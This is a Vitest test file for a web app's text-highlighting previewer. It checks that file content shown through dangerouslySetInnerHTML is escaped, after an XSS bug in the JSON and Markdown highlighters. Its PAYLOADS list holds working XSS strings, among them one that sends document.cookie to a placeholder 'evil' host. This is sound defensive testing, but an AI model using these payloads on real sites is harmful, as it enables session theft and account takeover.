import { describe, it, expect } from "vitest";
import { escapeHtml, getLanguage, highlightLine } from "@/lib/viewers/text-highlight";

/**
 * The text previewer writes `highlightLine`'s output into the DOM with
 * `dangerouslySetInnerHTML`, and its input is file content the viewer did not
 * write: a file uploaded by another member of a shared folder, or one behind a
 * public `/shared/[token]` link that anyone can open.
 *
 * Two highlighters used to run over the raw line — the JSON one always, the
 * Markdown one on any line with a link, `**bold**`, or a backtick — so
 * `<img src=x onerror=...>` in a previewed `.json`/`.md` file ran as script on our
 * origin, in the session of whoever opened the preview.
 *
 * So the invariant these tests hold is blunt: for EVERY language, no `<` from the
 * file may survive into the output as markup.
 */

/** Every language the previewer can select, plus a few unmapped ones. */
const LANGUAGES = [
  "json",
  "markdown",
  "javascript",
  "typescript",
  "python",
  "go",
  "rust",
  "java",
  "html",
  "css",
  "text",
  "yaml",
  "sql",
  "bash",
  "unknown-language",
];

/** Payloads that become executable script the moment a raw `<` gets through. */
const PAYLOADS = [
  '<img src=x onerror=alert(document.domain)>',
  '<script>alert(1)</script>',
  '<svg/onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<body onload=alert(1)>',
  '<a href="javascript:alert(1)">x</a>',
  '<style>@import"//evil";</style>',
  '<img src=x onerror="fetch(`//evil/?c=${document.cookie}`)">',
];

/** Wrappers that put a payload on a line each highlighter treats specially. */
const CONTEXTS: ((payload: string) => string)[] = [
  (p) => p,
  (p) => `{"key": "${p}"}`,
  (p) => `{"n": 1, "x": "${p}"}`,
  (p) => `# heading ${p}`,
  (p) => `- list ${p}`,
  (p) => `\`\`\`${p}`,
  (p) => `[link](http://x) ${p}`,
  (p) => `**bold** ${p}`,
  (p) => `\`code\` ${p}`,
  (p) => `**${p}**`,
  (p) => `\`${p}\``,
  (p) => `[${p}](http://x)`,
  (p) => `// comment ${p}`,
  (p) => `const a = "${p}";`,
  (p) => `def f(): return "${p}"`,
];

/** The markup the highlighters are allowed to introduce, so it can be removed. */
const OWN_MARKUP =
  /<\/?(?:span|strong|code)(?:\s+class="[^"<>]*")?>/g;

/**
 * What is left of the output once the highlighter's own tags are removed. Any
 * `<` still standing came from the file, which is exactly the bug.
 */
function fileContentOf(html: string): string {
  return html.replace(OWN_MARKUP, "");
}

describe("highlightLine — no file content escapes as markup", () => {
  for (const language of LANGUAGES) {
    it(`neutralizes every payload in every context for ${language}`, () => {
      for (const payload of PAYLOADS) {
        for (const wrap of CONTEXTS) {
          const line = wrap(payload);
          const out = highlightLine(line, language);
          const remainder = fileContentOf(out);
          expect(remainder, `${language} :: ${line}`).not.toContain("<");
          expect(remainder, `${language} :: ${line}`).not.toContain(">");
        }
      }
    });
  }

  it("leaves a bare payload as inert text for every language", () => {
    for (const language of LANGUAGES) {
      const out = highlightLine("<img src=x onerror=alert(1)>", language);
      // Colouring may wrap the `1`, but the tag itself must be text.
      expect(fileContentOf(out), language).toBe("&lt;img src=x onerror=alert(1)&gt;");
    }
  });
});

describe("highlightLine — JSON", () => {
  it("escapes a tag inside a string value", () => {
    const out = highlightLine('{"a": "<b>hi</b>"}', "json");
    expect(out).not.toContain("<b>");
    expect(out).toContain("&lt;b&gt;");
  });

  it("still colours keys, strings, numbers and literals", () => {
    const out = highlightLine('{"name": "kiro", "n": 42, "ok": true}', "json");
    expect(out).toContain("text-violet-400"); // key
    expect(out).toContain("text-emerald-400"); // string value
    expect(out).toContain("text-amber-400"); // number
    expect(out).toContain("text-cyan-400"); // literal
  });

  it("escapes an ampersand so entities cannot be smuggled in", () => {
    const out = highlightLine('{"a": "&lt;img src=x onerror=alert(1)&gt;"}', "json");
    expect(out).toContain("&amp;lt;");
    expect(fileContentOf(out)).not.toContain("<");
  });
});

describe("highlightLine — Markdown", () => {
  it("escapes a payload on a bold line", () => {
    const out = highlightLine("**x**<img src=x onerror=alert(1)>", "markdown");
    expect(out).toContain("<strong>x</strong>");
    expect(out).toContain("&lt;img");
    expect(fileContentOf(out)).not.toContain("<");
  });

  it("escapes a payload on a link line", () => {
    const out = highlightLine("[a](http://x)<svg/onload=alert(1)>", "markdown");
    expect(out).not.toContain("<svg");
    expect(out).toContain("&lt;svg");
  });

  it("escapes a payload on an inline-code line", () => {
    const out = highlightLine("`c`<img src=x onerror=alert(1)>", "markdown");
    expect(out).toContain("<code");
    expect(out).not.toContain("<img");
  });

  it("escapes a payload inside the bold delimiters themselves", () => {
    const out = highlightLine("**<img src=x onerror=alert(1)>**", "markdown");
    expect(out).toBe("<strong>&lt;img src=x onerror=alert(1)&gt;</strong>");
  });

  it("escapes a payload inside link text", () => {
    const out = highlightLine("[<img src=x onerror=alert(1)>](http://e)", "markdown");
    expect(out).not.toContain("<img");
    expect(out).toContain("text-blue-400");
  });

  it("escapes a payload in a heading and in a list item", () => {
    expect(highlightLine("# <b>t</b>", "markdown")).not.toContain("<b>");
    expect(highlightLine("- <b>t</b>", "markdown")).not.toContain("<b>");
  });

  it("escapes a payload on a fenced-code marker line", () => {
    const out = highlightLine("```<img src=x onerror=alert(1)>", "markdown");
    expect(out).not.toContain("<img");
  });

  it("keeps the formatting it is there to provide", () => {
    expect(highlightLine("# Title", "markdown")).toContain("text-violet-400");
    expect(highlightLine("- item", "markdown")).toContain("text-accent");
    expect(highlightLine("**b**", "markdown")).toContain("<strong>b</strong>");
    expect(highlightLine("`c`", "markdown")).toContain("<code");
    expect(highlightLine("[t](u)", "markdown")).toContain("text-blue-400");
  });

  it("leaves ordinary prose alone apart from escaping", () => {
    expect(highlightLine("just a sentence", "markdown")).toBe("just a sentence");
  });
});

describe("highlightLine — generic languages", () => {
  it("escapes a tag in a code string and still colours it", () => {
    const out = highlightLine('const a = "<img src=x>";', "javascript");
    expect(out).not.toContain("<img");
    expect(out).toContain("&lt;img");
    expect(out).toContain("text-violet-400"); // `const`
  });

  it("escapes HTML source being previewed as HTML", () => {
    const out = highlightLine('<div onclick="alert(1)">x</div>', "html");
    expect(fileContentOf(out)).not.toContain("<");
  });

  it("passes plain text through untouched except for escaping", () => {
    expect(highlightLine("a > b < c & d", "text")).toBe("a &gt; b &lt; c &amp; d");
    expect(highlightLine("nothing special", "text")).toBe("nothing special");
  });

  it("handles an empty line", () => {
    for (const language of LANGUAGES) {
      expect(highlightLine("", language)).toBe("");
    }
  });
});

describe("the markup the highlighter emits", () => {
  /** Realistic lines, one per pass that can fire. */
  const LINES: [string, string][] = [
    ["javascript", 'const answer = "42"; // note'],
    ["javascript", "class Foo extends Bar { }"],
    ["typescript", "@Injectable() export class A implements B {}"],
    ["python", "def f(self): return {'a': 1}  # comment"],
    ["go", "func main() { x := 400; _ = x }"],
    ["rust", "let v: Vec<u8> = Vec::new();"],
    ["java", "public static final int N = 400;"],
    ["json", '{"name": "kiro", "n": 400, "ok": true, "nil": null}'],
    ["markdown", "## Heading with `code` and **bold**"],
    ["markdown", "- item [link](http://example.test) 400"],
    ["text", "plain 400 text"],
  ];

  it("only ever opens its own three tags", () => {
    for (const [language, line] of LINES) {
      const out = highlightLine(line, language);
      for (const match of out.matchAll(/<[^>]*/g)) {
        expect(match[0], `${language} :: ${line}`).toMatch(
          /^<\/?(?:span|strong|code)(?:\s|$)|^<\/?(?:span|strong|code)$/
        );
      }
    }
  });

  it("balances the tags it opens", () => {
    for (const [language, line] of LINES) {
      const out = highlightLine(line, language);
      const opens = out.match(/<(?:span|strong|code)\b/g)?.length ?? 0;
      const closes = out.match(/<\/(?:span|strong|code)>/g)?.length ?? 0;
      expect(closes, `${language} :: ${line}`).toBe(opens);
    }
  });

  it("does not re-highlight the class names it just inserted", () => {
    // `class="text-amber-400"` holds both a number and the JS keyword `class`, so a
    // pass that ran over the previous pass's markup produced tags inside tags.
    const out = highlightLine('const a = "x"; // 1', "javascript");
    expect(out).not.toContain("<span <span");
    expect(out).not.toMatch(/class="[^"]*<span/);
    expect(out).not.toContain("text-amber-<span");
  });

  it("keeps the file's own text intact once the markup is removed", () => {
    for (const [language, line] of LINES) {
      expect(fileContentOf(highlightLine(line, language)), language).toBe(escapeHtml(line));
    }
  });
});

describe("token forgery", () => {
  const START = "\u0000";
  const UNIT = "\u0002";
  const END = "\u0001";

  it("cannot be used to inject markup from file content", () => {
    const forged = `${START}${UNIT}${END}zz${START}${UNIT}${UNIT}${END}`;
    for (const language of LANGUAGES) {
      const out = highlightLine(forged, language);
      expect(out, language).not.toContain("<span");
      expect(out, language).not.toContain("<strong");
      expect(out, language).not.toContain("<code");
    }
  });

  it("cannot close a tag the highlighter opened", () => {
    // `</span>` occupies a slot too; a forged token must not reach it.
    const out = highlightLine(`**bold**${START}${UNIT}${UNIT}${END}`, "markdown");
    const opens = out.match(/<strong>/g)?.length ?? 0;
    const closes = out.match(/<\/strong>/g)?.length ?? 0;
    expect(opens).toBe(1);
    expect(closes).toBe(1);
  });

  it("replaces the control characters rather than dropping them silently", () => {
    expect(highlightLine(`a${START}b`, "text")).toBe("a�b");
  });
});

describe("escapeHtml", () => {
  it("escapes the three characters that can open markup", () => {
    expect(escapeHtml("<a>&b</a>")).toBe("&lt;a&gt;&amp;b&lt;/a&gt;");
  });

  it("escapes the ampersand first, so escaping is not reversible by input", () => {
    // If `&` were escaped last, "&lt;" in the file would decode to "<".
    expect(escapeHtml("&lt;script&gt;")).toBe("&amp;lt;script&amp;gt;");
  });

  it("leaves quotes alone — output is element content, never an attribute", () => {
    expect(escapeHtml(`he said "hi" and 'bye'`)).toBe(`he said "hi" and 'bye'`);
  });
});

describe("getLanguage", () => {
  it("maps known extensions", () => {
    expect(getLanguage("ts")).toBe("typescript");
    expect(getLanguage("md")).toBe("markdown");
    expect(getLanguage("json")).toBe("json");
  });

  it("falls back to text for anything unknown", () => {
    expect(getLanguage("wat")).toBe("text");
    expect(getLanguage("")).toBe("text");
  });
});
